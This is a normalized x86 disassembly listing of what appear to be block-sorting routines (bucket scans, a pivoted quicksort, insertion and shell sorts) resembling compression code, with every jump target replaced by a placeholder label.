mov [ ebp - 0x424 ] eax
jmp r-xdata
cmp [ ebp - 0x830 ] 0x0
jne r-xdata
mov eax [ ebp - 0x424 ]
sub eax 0x1
mov [ ebp - 0x428 ] eax
mov ecx [ ebp - 0x428 ]
cmp ecx [ ebp + 0x14 ]
jl r-xdata
mov edx [ ebp - 0x424 ]
sar edx 0x5
mov eax [ ebp + 0x10 ]
cmp [ eax + edx * 4 ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0x424 ]
add eax 0x1
mov [ ebp - 0x424 ] eax
jmp r-xdata
mov ecx [ ebp - 0x18 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
jmp r-xdata
mov edx [ ebp - 0x424 ]
sar edx 0x5
mov ecx [ ebp - 0x424 ]
and ecx 0x1f
mov eax 0x1
shl eax cl
mov ecx [ ebp + 0x10 ]
and eax [ ecx + edx * 4 ]
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x424 ]
sar edx 0x5
mov ecx [ ebp - 0x424 ]
and ecx 0x1f
mov eax 0x1
shl eax cl
mov ecx [ ebp + 0x10 ]
and eax [ ecx + edx * 4 ]
je r-xdata
mov ecx [ ebp - 0x424 ]
add ecx 0x20
mov [ ebp - 0x424 ] ecx
jmp r-xdata
mov eax [ ebp - 0x424 ]
sar eax 0x5
mov ecx [ ebp - 0x424 ]
and ecx 0x1f
mov edx 0x1
shl edx cl
mov ecx [ ebp + 0x10 ]
and edx [ ecx + eax * 4 ]
je r-xdata
mov edx 0x1
test edx edx
je r-xdata
mov edx [ ebp - 0x424 ]
sar edx 0x5
mov ecx [ ebp - 0x424 ]
and ecx 0x1f
mov eax 0x1
shl eax cl
mov ecx [ ebp + 0x10 ]
and eax [ ecx + edx * 4 ]
jne r-xdata
mov edx [ ebp - 0x424 ]
and edx 0x1f
je r-xdata
mov edx [ ebp - 0x424 ]
add edx 0x1
mov [ ebp - 0x424 ] edx
jmp r-xdata
mov eax [ ebp - 0x424 ]
sub eax 0x1
mov [ ebp - 0x82c ] eax
mov ecx [ ebp - 0x82c ]
cmp ecx [ ebp + 0x14 ]
jl r-xdata
mov edx [ ebp - 0x424 ]
sar edx 0x5
mov eax [ ebp + 0x10 ]
cmp [ eax + edx * 4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x424 ]
add eax 0x1
mov [ ebp - 0x424 ] eax
jmp r-xdata
mov edx [ ebp - 0x82c ]
cmp edx [ ebp - 0x428 ]
jle r-xdata
jmp r-xdata
mov edx [ ebp - 0x424 ]
sar edx 0x5
mov ecx [ ebp - 0x424 ]
and ecx 0x1f
mov eax 0x1
shl eax cl
mov ecx [ ebp + 0x10 ]
and eax [ ecx + edx * 4 ]
jne r-xdata
mov ecx [ ebp - 0x424 ]
add ecx 0x20
mov [ ebp - 0x424 ] ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x82c ]
sub eax [ ebp - 0x428 ]
mov ecx [ ebp - 0x830 ]
lea edx [ ecx + eax + 0x1 ]
mov [ ebp - 0x830 ] edx
mov eax [ ebp - 0x82c ]
push eax
mov ecx [ ebp - 0x428 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_411150
add esp 0x10
mov [ ebp - 0x10 ] 0xffffffff
mov ecx [ ebp - 0x428 ]
mov [ ebp - 0x18 ] ecx
jmp r-xdata
mov edx [ ebp - 0x424 ]
add edx 0x1
mov [ ebp - 0x424 ] edx
jmp r-xdata
mov ecx 0x1
test ecx ecx
je r-xdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x82c ]
jg r-xdata
mov ecx [ ebp - 0x18 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + ecx * 4 ]
mov ecx [ ebp + 0xc ]
mov edx [ ecx + eax * 4 ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x18 ]
sar edx 0x5
mov ecx [ ebp - 0x18 ]
and ecx 0x1f
mov eax 0x1
shl eax cl
mov ecx [ ebp + 0x10 ]
or eax [ ecx + edx * 4 ]
mov edx [ ebp - 0x18 ]
sar edx 0x5
mov ecx [ ebp + 0x10 ]
mov [ ecx + edx * 4 ] eax
mov edx [ ebp - 0x4 ]
mov [ ebp - 0x10 ] edx
mov edx [ ebp - 0x18 ]
add edx 0x1
mov [ ebp - 0x18 ] edx
sub_411150
push ebp
mov ebp esp
sub esp 0x38c
push esi
mov [ ebp - 0x350 ] 0x0
mov [ ebp - 0x19c ] 0x0
mov eax [ ebp - 0x19c ]
mov ecx [ ebp + 0x10 ]
mov [ ebp + eax * 4 - 0x198 ] ecx
mov edx [ ebp - 0x19c ]
mov eax [ ebp + 0x14 ]
mov [ ebp + edx * 4 - 0x338 ] eax
mov ecx [ ebp - 0x19c ]
add ecx 0x1
mov [ ebp - 0x19c ] ecx
pop esi
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x19c ] 0x63
jl r-xdata
mov edx [ ebp - 0x19c ]
sub edx 0x1
mov [ ebp - 0x19c ] edx
mov eax [ ebp - 0x19c ]
mov ecx [ ebp + eax * 4 - 0x198 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x19c ]
mov eax [ ebp + edx * 4 - 0x338 ]
mov [ ebp - 0x344 ] eax
mov ecx [ ebp - 0x344 ]
sub ecx [ ebp - 0x4 ]
cmp ecx 0xa
jge r-xdata
push 0x3ec
call sub_4057d5
add esp 0x4
mov eax [ ebp - 0x350 ]
imul eax eax 0x1dc5
add eax 0x1
xor edx edx
mov ecx 0x8000
div ecx
mov [ ebp - 0x350 ] edx
mov eax [ ebp - 0x350 ]
xor edx edx
mov ecx 0x3
div ecx
mov [ ebp - 0x354 ] edx
cmp [ ebp - 0x354 ] 0x0
jne r-xdata
mov edx [ ebp - 0x344 ]
push edx
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_4117f0
add esp 0x10
jmp r-xdata
cmp [ ebp - 0x354 ] 0x1
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + edx * 4 ]
mov edx [ ebp + 0xc ]
mov eax [ edx + ecx * 4 ]
mov [ ebp - 0x340 ] eax
jmp r-xdata
cmp [ ebp - 0x19c ] 0x0
jle r-xdata
mov eax [ ebp - 0x344 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 ]
mov eax [ ebp + 0xc ]
mov ecx [ eax + edx * 4 ]
mov [ ebp - 0x340 ] ecx
mov ecx [ ebp - 0x4 ]
add ecx [ ebp - 0x344 ]
sar ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx + ecx * 4 ]
mov ecx [ ebp + 0xc ]
mov edx [ ecx + eax * 4 ]
mov [ ebp - 0x340 ] edx
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov [ ebp - 0x348 ] edx
mov eax [ ebp - 0x348 ]
mov [ ebp - 0x33c ] eax
mov ecx [ ebp - 0x344 ]
mov [ ebp - 0x1a4 ] ecx
mov edx [ ebp - 0x1a4 ]
mov [ ebp - 0x34c ] edx
xor eax eax
jne r-xdata
mov ecx 0x1
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x1a4 ]
cmp ecx [ ebp - 0x348 ]
jge r-xdata
mov edx 0x1
test edx edx
je r-xdata
mov edx [ ebp - 0x33c ]
cmp edx [ ebp - 0x34c ]
jle r-xdata
mov edx [ ebp - 0x348 ]
sub edx [ ebp - 0x4 ]
mov eax [ ebp - 0x33c ]
sub eax [ ebp - 0x348 ]
cmp edx eax
jge r-xdata
jmp r-xdata
mov eax [ ebp - 0x33c ]
cmp eax [ ebp - 0x34c ]
jle r-xdata
mov eax [ ebp - 0x33c ]
cmp eax [ ebp - 0x34c ]
jle r-xdata
mov eax [ ebp - 0x33c ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 ]
mov eax [ ebp + 0xc ]
mov ecx [ eax + edx * 4 ]
sub ecx [ ebp - 0x340 ]
mov [ ebp - 0x1a0 ] ecx
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x33c ]
sub edx [ ebp - 0x348 ]
mov [ ebp - 0x388 ] edx
mov ecx [ ebp - 0x348 ]
sub ecx [ ebp - 0x4 ]
mov [ ebp - 0x388 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x33c ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + ecx * 4 ]
mov [ ebp - 0x364 ] eax
mov ecx [ ebp - 0x33c ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x34c ]
mov esi [ ebp + 0x8 ]
mov eax [ esi + eax * 4 ]
mov [ edx + ecx * 4 ] eax
mov ecx [ ebp - 0x34c ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x364 ]
mov [ edx + ecx * 4 ] eax
mov ecx [ ebp - 0x33c ]
add ecx 0x1
mov [ ebp - 0x33c ] ecx
mov edx [ ebp - 0x34c ]
sub edx 0x1
mov [ ebp - 0x34c ] edx
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x34c ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + ecx * 4 ]
mov ecx [ ebp + 0xc ]
mov edx [ ecx + eax * 4 ]
sub edx [ ebp - 0x340 ]
mov [ ebp - 0x1a0 ] edx
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x1a0 ] 0x0
jle r-xdata
mov edx [ ebp - 0x33c ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + edx * 4 ]
mov [ ebp - 0x35c ] ecx
mov edx [ ebp - 0x33c ]
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x348 ]
mov esi [ ebp + 0x8 ]
mov ecx [ esi + ecx * 4 ]
mov [ eax + edx * 4 ] ecx
mov edx [ ebp - 0x348 ]
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x35c ]
mov [ eax + edx * 4 ] ecx
mov edx [ ebp - 0x348 ]
add edx 0x1
mov [ ebp - 0x348 ] edx
mov eax [ ebp - 0x33c ]
add eax 0x1
mov [ ebp - 0x33c ] eax
jmp r-xdata
mov ecx [ ebp - 0x344 ]
sub ecx [ ebp - 0x1a4 ]
mov edx [ ebp - 0x1a4 ]
sub edx [ ebp - 0x34c ]
cmp ecx edx
jge r-xdata
mov ecx [ ebp - 0x36c ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + ecx * 4 ]
mov [ ebp - 0x374 ] eax
mov ecx [ ebp - 0x36c ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x368 ]
mov esi [ ebp + 0x8 ]
mov eax [ esi + eax * 4 ]
mov [ edx + ecx * 4 ] eax
mov ecx [ ebp - 0x368 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x374 ]
mov [ edx + ecx * 4 ] eax
mov ecx [ ebp - 0x36c ]
add ecx 0x1
mov [ ebp - 0x36c ] ecx
mov edx [ ebp - 0x368 ]
add edx 0x1
mov [ ebp - 0x368 ] edx
mov eax [ ebp - 0x370 ]
sub eax 0x1
mov [ ebp - 0x370 ] eax
jmp r-xdata
mov eax [ ebp - 0x388 ]
mov [ ebp - 0x1a0 ] eax
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x36c ] ecx
mov edx [ ebp - 0x33c ]
sub edx [ ebp - 0x1a0 ]
mov [ ebp - 0x368 ] edx
mov eax [ ebp - 0x1a0 ]
mov [ ebp - 0x370 ] eax
mov eax 0x1
test eax eax
je r-xdata
cmp [ ebp - 0x1a0 ] 0x0
jge r-xdata
mov eax [ ebp - 0x34c ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 ]
mov [ ebp - 0x360 ] edx
mov eax [ ebp - 0x34c ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x1a4 ]
mov esi [ ebp + 0x8 ]
mov edx [ esi + edx * 4 ]
mov [ ecx + eax * 4 ] edx
mov eax [ ebp - 0x1a4 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x360 ]
mov [ ecx + eax * 4 ] edx
mov eax [ ebp - 0x1a4 ]
sub eax 0x1
mov [ ebp - 0x1a4 ] eax
mov ecx [ ebp - 0x34c ]
sub ecx 0x1
mov [ ebp - 0x34c ] ecx
jmp r-xdata
mov ecx [ ebp - 0x33c ]
add ecx 0x1
mov [ ebp - 0x33c ] ecx
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x1a4 ]
sub ecx [ ebp - 0x34c ]
mov [ ebp - 0x38c ] ecx
mov eax [ ebp - 0x344 ]
sub eax [ ebp - 0x1a4 ]
mov [ ebp - 0x38c ] eax
jmp r-xdata
cmp [ ebp - 0x370 ] 0x0
jle r-xdata
mov edx [ ebp - 0x34c ]
sub edx 0x1
mov [ ebp - 0x34c ] edx
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0x33c ]
sub eax [ ebp - 0x348 ]
sub eax 0x1
mov [ ebp - 0x1a0 ] eax
mov ecx [ ebp - 0x1a4 ]
sub ecx [ ebp - 0x34c ]
mov edx [ ebp - 0x344 ]
sub edx ecx
add edx 0x1
mov [ ebp - 0x358 ] edx
mov eax [ ebp - 0x1a0 ]
sub eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x344 ]
sub ecx [ ebp - 0x358 ]
cmp eax ecx
jle r-xdata
mov eax [ ebp - 0x37c ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 ]
mov [ ebp - 0x384 ] edx
mov eax [ ebp - 0x37c ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x378 ]
mov esi [ ebp + 0x8 ]
mov edx [ esi + edx * 4 ]
mov [ ecx + eax * 4 ] edx
mov eax [ ebp - 0x378 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x384 ]
mov [ ecx + eax * 4 ] edx
mov eax [ ebp - 0x37c ]
add eax 0x1
mov [ ebp - 0x37c ] eax
mov ecx [ ebp - 0x378 ]
add ecx 0x1
mov [ ebp - 0x378 ] ecx
mov edx [ ebp - 0x380 ]
sub edx 0x1
mov [ ebp - 0x380 ] edx
jmp r-xdata
mov edx [ ebp - 0x38c ]
mov [ ebp - 0x358 ] edx
mov eax [ ebp - 0x33c ]
mov [ ebp - 0x37c ] eax
mov ecx [ ebp - 0x344 ]
sub ecx [ ebp - 0x358 ]
add ecx 0x1
mov [ ebp - 0x378 ] ecx
mov edx [ ebp - 0x358 ]
mov [ ebp - 0x380 ] edx
mov eax [ ebp - 0x19c ]
mov ecx [ ebp - 0x358 ]
mov [ ebp + eax * 4 - 0x198 ] ecx
mov edx [ ebp - 0x19c ]
mov eax [ ebp - 0x344 ]
mov [ ebp + edx * 4 - 0x338 ] eax
mov ecx [ ebp - 0x19c ]
add ecx 0x1
mov [ ebp - 0x19c ] ecx
mov edx [ ebp - 0x19c ]
mov eax [ ebp - 0x4 ]
mov [ ebp + edx * 4 - 0x198 ] eax
mov ecx [ ebp - 0x19c ]
mov edx [ ebp - 0x1a0 ]
mov [ ebp + ecx * 4 - 0x338 ] edx
mov eax [ ebp - 0x19c ]
add eax 0x1
mov [ ebp - 0x19c ] eax
mov edx [ ebp - 0x19c ]
mov eax [ ebp - 0x4 ]
mov [ ebp + edx * 4 - 0x198 ] eax
mov ecx [ ebp - 0x19c ]
mov edx [ ebp - 0x1a0 ]
mov [ ebp + ecx * 4 - 0x338 ] edx
mov eax [ ebp - 0x19c ]
add eax 0x1
mov [ ebp - 0x19c ] eax
mov ecx [ ebp - 0x19c ]
mov edx [ ebp - 0x358 ]
mov [ ebp + ecx * 4 - 0x198 ] edx
mov eax [ ebp - 0x19c ]
mov ecx [ ebp - 0x344 ]
mov [ ebp + eax * 4 - 0x338 ] ecx
mov edx [ ebp - 0x19c ]
add edx 0x1
mov [ ebp - 0x19c ] edx
jmp r-xdata
cmp [ ebp - 0x380 ] 0x0
jle r-xdata
jmp r-xdata
sub_4117f0
push ebp
mov ebp esp
sub esp 0x10
push esi
mov eax [ ebp + 0x10 ]
cmp eax [ ebp + 0x14 ]
jne r-xdata
mov ecx [ ebp + 0x14 ]
sub ecx [ ebp + 0x10 ]
cmp ecx 0x3
jle r-xdata
jmp r-xdata
mov ecx [ ebp + 0x14 ]
sub ecx 0x1
mov [ ebp - 0x8 ] ecx
jmp r-xdata
mov edx [ ebp + 0x14 ]
sub edx 0x4
mov [ ebp - 0x8 ] edx
jmp r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
cmp eax [ ebp + 0x10 ]
jl r-xdata
mov ecx [ ebp - 0x8 ]
cmp ecx [ ebp + 0x10 ]
jl r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + ecx * 4 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp + 0xc ]
mov eax [ edx + ecx * 4 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x10 ] ecx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + edx * 4 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp + 0xc ]
mov ecx [ eax + edx * 4 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x8 ]
add edx 0x4
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp + 0x14 ]
jg r-xdata
mov ecx [ ebp - 0x10 ]
cmp ecx [ ebp + 0x14 ]
jg r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov [ ecx + eax * 4 - 0x4 ] edx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + ecx * 4 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
cmp edx [ ecx + eax * 4 ]
jbe r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0xc ]
mov [ edx + ecx * 4 - 0x10 ] eax
jmp r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + edx * 4 ]
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
cmp eax [ edx + ecx * 4 ]
jbe r-xdata
mov edx [ ebp - 0x8 ]
sub edx 0x1
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x10 ]
mov esi [ ebp + 0x8 ]
mov edx [ esi + edx * 4 ]
mov [ ecx + eax * 4 - 0x4 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
sub eax 0x1
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
mov esi [ ebp + 0x8 ]
mov eax [ esi + eax * 4 ]
mov [ edx + ecx * 4 - 0x10 ] eax
jmp r-xdata
mov edx [ ebp - 0x10 ]
add edx 0x1
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x10 ]
add eax 0x4
mov [ ebp - 0x10 ] eax
sub_411930
push ebp
mov ebp esp
sub esp 0xd44
push esi
push edi
cmp [ ebp + 0x1c ] 0x4
jl r-xdata
mov [ ebp - 0xd04 ] 0x10000
jmp r-xdata
xor eax eax
jne r-xdata
cmp [ ebp - 0xd04 ] 0x0
jl r-xdata
mov ecx [ ebp + 0xc ]
movzx edx [ ecx ]
shl edx 0x8
mov [ ebp - 0xd20 ] edx
mov eax [ ebp + 0x18 ]
sub eax 0x1
mov [ ebp - 0xd04 ] eax
jmp r-xdata
mov edx [ ebp - 0xd04 ]
mov eax [ ebp + 0x14 ]
mov [ eax + edx * 4 ] 0x0
jmp r-xdata
cmp [ ebp - 0xd04 ] 0x3
jl r-xdata
mov ecx [ ebp - 0xd04 ]
sub ecx 0x1
mov [ ebp - 0xd04 ] ecx
jmp r-xdata
mov edx [ ebp - 0xd04 ]
mov eax [ ebp + 0x10 ]
mov [ eax + edx * 2 ] 0x0
mov ecx [ ebp - 0xd20 ]
sar ecx 0x8
mov edx [ ebp + 0xc ]
add edx [ ebp - 0xd04 ]
movzx eax [ edx ]
shl eax 0x8
or ecx eax
mov [ ebp - 0xd20 ] ecx
mov ecx [ ebp - 0xd20 ]
mov edx [ ebp + 0x14 ]
mov eax [ edx + ecx * 4 ]
add eax 0x1
mov ecx [ ebp - 0xd20 ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] eax
mov eax [ ebp - 0xd04 ]
mov ecx [ ebp + 0x10 ]
mov [ ecx + eax * 2 - 0x2 ] 0x0
mov edx [ ebp - 0xd20 ]
sar edx 0x8
mov eax [ ebp + 0xc ]
add eax [ ebp - 0xd04 ]
movzx ecx [ eax - 0x1 ]
shl ecx 0x8
or edx ecx
mov [ ebp - 0xd20 ] edx
mov edx [ ebp - 0xd20 ]
mov eax [ ebp + 0x14 ]
mov ecx [ eax + edx * 4 ]
add ecx 0x1
mov edx [ ebp - 0xd20 ]
mov eax [ ebp + 0x14 ]
mov [ eax + edx * 4 ] ecx
mov ecx [ ebp - 0xd04 ]
mov edx [ ebp + 0x10 ]
mov [ edx + ecx * 2 - 0x4 ] 0x0
mov eax [ ebp - 0xd20 ]
sar eax 0x8
mov ecx [ ebp + 0xc ]
add ecx [ ebp - 0xd04 ]
movzx edx [ ecx - 0x2 ]
shl edx 0x8
or eax edx
mov [ ebp - 0xd20 ] eax
mov eax [ ebp - 0xd20 ]
mov ecx [ ebp + 0x14 ]
mov edx [ ecx + eax * 4 ]
add edx 0x1
mov eax [ ebp - 0xd20 ]
mov ecx [ ebp + 0x14 ]
mov [ ecx + eax * 4 ] edx
mov edx [ ebp - 0xd04 ]
mov eax [ ebp + 0x10 ]
mov [ eax + edx * 2 - 0x6 ] 0x0
mov ecx [ ebp - 0xd20 ]
sar ecx 0x8
mov edx [ ebp + 0xc ]
add edx [ ebp - 0xd04 ]
movzx eax [ edx - 0x3 ]
shl eax 0x8
or ecx eax
mov [ ebp - 0xd20 ] ecx
mov ecx [ ebp - 0xd20 ]
mov edx [ ebp + 0x14 ]
mov eax [ edx + ecx * 4 ]
add eax 0x1
mov ecx [ ebp - 0xd20 ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] eax
jmp r-xdata
cmp [ ebp - 0xd04 ] 0x0
jl r-xdata
mov ecx [ ebp - 0xd04 ]
sub ecx 0x4
mov [ ebp - 0xd04 ] ecx
mov [ ebp - 0xd04 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0xd04 ]
mov edx [ ebp + 0x10 ]
mov [ edx + ecx * 2 ] 0x0
mov eax [ ebp - 0xd20 ]
sar eax 0x8
mov ecx [ ebp + 0xc ]
add ecx [ ebp - 0xd04 ]
movzx edx [ ecx ]
shl edx 0x8
or eax edx
mov [ ebp - 0xd20 ] eax
mov eax [ ebp - 0xd20 ]
mov ecx [ ebp + 0x14 ]
mov edx [ ecx + eax * 4 ]
add edx 0x1
mov eax [ ebp - 0xd20 ]
mov ecx [ ebp + 0x14 ]
mov [ ecx + eax * 4 ] edx
jmp r-xdata
cmp [ ebp - 0xd04 ] 0x22
jge r-xdata
mov eax [ ebp - 0xd04 ]
sub eax 0x1
mov [ ebp - 0xd04 ] eax
cmp [ ebp + 0x1c ] 0x4
jl r-xdata
mov eax [ ebp + 0x18 ]
add eax [ ebp - 0xd04 ]
mov ecx [ ebp + 0xc ]
add ecx [ ebp - 0xd04 ]
mov edx [ ebp + 0xc ]
mov cl [ ecx ]
mov [ edx + eax ] cl
mov edx [ ebp + 0x18 ]
add edx [ ebp - 0xd04 ]
mov eax [ ebp + 0x10 ]
mov [ eax + edx * 2 ] 0x0
jmp r-xdata
mov [ ebp - 0xd04 ] 0x1
jmp r-xdata
xor ecx ecx
jne r-xdata
mov edx [ ebp - 0xd04 ]
add edx 0x1
mov [ ebp - 0xd04 ] edx
cmp [ ebp - 0xd04 ] 0x10000
jg r-xdata
mov edx [ ebp + 0xc ]
movzx eax [ edx ]
shl eax 0x8
mov [ ebp - 0xd08 ] ax
mov ecx [ ebp + 0x18 ]
sub ecx 0x1
mov [ ebp - 0xd04 ] ecx
jmp r-xdata
mov eax [ ebp - 0xd04 ]
mov ecx [ ebp + 0x14 ]
mov edx [ ecx + eax * 4 ]
mov eax [ ebp - 0xd04 ]
mov ecx [ ebp + 0x14 ]
add edx [ ecx + eax * 4 - 0x4 ]
mov eax [ ebp - 0xd04 ]
mov ecx [ ebp + 0x14 ]
mov [ ecx + eax * 4 ] edx
jmp r-xdata
cmp [ ebp - 0xd04 ] 0x3
jl r-xdata
mov edx [ ebp - 0xd04 ]
add edx 0x1
mov [ ebp - 0xd04 ] edx
jmp r-xdata
movzx eax [ ebp - 0xd08 ]
sar eax 0x8
mov ecx [ ebp + 0xc ]
add ecx [ ebp - 0xd04 ]
movzx edx [ ecx ]
shl edx 0x8
or eax edx
mov [ ebp - 0xd08 ] ax
movzx eax [ ebp - 0xd08 ]
mov ecx [ ebp + 0x14 ]
mov edx [ ecx + eax * 4 ]
sub edx 0x1
mov [ ebp - 0xd20 ] edx
movzx eax [ ebp - 0xd08 ]
mov ecx [ ebp + 0x14 ]
mov edx [ ebp - 0xd20 ]
mov [ ecx + eax * 4 ] edx
mov eax [ ebp - 0xd20 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0xd04 ]
mov [ ecx + eax * 4 ] edx
movzx eax [ ebp - 0xd08 ]
sar eax 0x8
mov ecx [ ebp + 0xc ]
add ecx [ ebp - 0xd04 ]
movzx edx [ ecx - 0x1 ]
shl edx 0x8
or eax edx
mov [ ebp - 0xd08 ] ax
movzx eax [ ebp - 0xd08 ]
mov ecx [ ebp + 0x14 ]
mov edx [ ecx + eax * 4 ]
sub edx 0x1
mov [ ebp - 0xd20 ] edx
movzx eax [ ebp - 0xd08 ]
mov ecx [ ebp + 0x14 ]
mov edx [ ebp - 0xd20 ]
mov [ ecx + eax * 4 ] edx
mov eax [ ebp - 0xd04 ]
sub eax 0x1
mov ecx [ ebp - 0xd20 ]
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 ] eax
movzx eax [ ebp - 0xd08 ]
sar eax 0x8
mov ecx [ ebp + 0xc ]
add ecx [ ebp - 0xd04 ]
movzx edx [ ecx - 0x2 ]
shl edx 0x8
or eax edx
mov [ ebp - 0xd08 ] ax
movzx eax [ ebp - 0xd08 ]
mov ecx [ ebp + 0x14 ]
mov edx [ ecx + eax * 4 ]
sub edx 0x1
mov [ ebp - 0xd20 ] edx
movzx eax [ ebp - 0xd08 ]
mov ecx [ ebp + 0x14 ]
mov edx [ ebp - 0xd20 ]
mov [ ecx + eax * 4 ] edx
mov eax [ ebp - 0xd04 ]
sub eax 0x2
mov ecx [ ebp - 0xd20 ]
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 ] eax
movzx eax [ ebp - 0xd08 ]
sar eax 0x8
mov ecx [ ebp + 0xc ]
add ecx [ ebp - 0xd04 ]
movzx edx [ ecx - 0x3 ]
shl edx 0x8
or eax edx
mov [ ebp - 0xd08 ] ax
movzx eax [ ebp - 0xd08 ]
mov ecx [ ebp + 0x14 ]
mov edx [ ecx + eax * 4 ]
sub edx 0x1
mov [ ebp - 0xd20 ] edx
movzx eax [ ebp - 0xd08 ]
mov ecx [ ebp + 0x14 ]
mov edx [ ebp - 0xd20 ]
mov [ ecx + eax * 4 ] edx
mov eax [ ebp - 0xd04 ]
sub eax 0x3
mov ecx [ ebp - 0xd20 ]
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 ] eax
jmp r-xdata
cmp [ ebp - 0xd04 ] 0x0
jl r-xdata
mov edx [ ebp - 0xd04 ]
sub edx 0x4
mov [ ebp - 0xd04 ] edx
mov [ ebp - 0xd04 ] 0x0
jmp r-xdata
movzx ecx [ ebp - 0xd08 ]
sar ecx 0x8
mov edx [ ebp + 0xc ]
add edx [ ebp - 0xd04 ]
movzx eax [ edx ]
shl eax 0x8
or ecx eax
mov [ ebp - 0xd08 ] cx
movzx ecx [ ebp - 0xd08 ]
mov edx [ ebp + 0x14 ]
mov eax [ edx + ecx * 4 ]
sub eax 0x1
mov [ ebp - 0xd20 ] eax
movzx ecx [ ebp - 0xd08 ]
mov edx [ ebp + 0x14 ]
mov eax [ ebp - 0xd20 ]
mov [ edx + ecx * 4 ] eax
mov ecx [ ebp - 0xd20 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0xd04 ]
mov [ edx + ecx * 4 ] eax
jmp r-xdata
cmp [ ebp - 0xd04 ] 0xff
jg r-xdata
mov eax [ ebp - 0xd04 ]
sub eax 0x1
mov [ ebp - 0xd04 ] eax
mov [ ebp - 0xd24 ] 0x1
mov edx [ ebp - 0xd04 ]
mov [ ebp + edx - 0x100 ] 0x0
mov eax [ ebp - 0xd04 ]
mov ecx [ ebp - 0xd04 ]
mov [ ebp + eax * 4 - 0x500 ] ecx
jmp r-xdata
mov edx [ ebp - 0xd24 ]
imul edx edx 0x3
add edx 0x1
mov [ ebp - 0xd24 ] edx
cmp [ ebp - 0xd24 ] 0x100
jle r-xdata
mov eax [ ebp - 0xd24 ]
cdq
mov ecx 0x3
idiv ecx
mov [ ebp - 0xd24 ] eax
mov edx [ ebp - 0xd24 ]
mov [ ebp - 0xd04 ] edx
